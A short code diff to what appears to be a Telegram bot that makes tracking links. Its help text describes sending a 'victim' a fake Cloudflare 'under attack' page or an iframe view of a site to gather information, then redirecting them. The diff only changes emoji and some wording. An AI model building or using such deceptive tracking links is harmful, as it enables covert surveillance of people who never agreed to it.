@@ -84,8 +84,8 @@ the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://t.me/DARK_H4CK3R_369
+( ⎙ Many sites may not work under this method if they have x-frame header present.
+\n\nhttps://t.me/DARK_H4CK3R_369
 `);
 }
   
@@ -157,7 +157,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+bot.sendMessage(cid,`〄 Enter Your URL`,mk);
 }
 
 
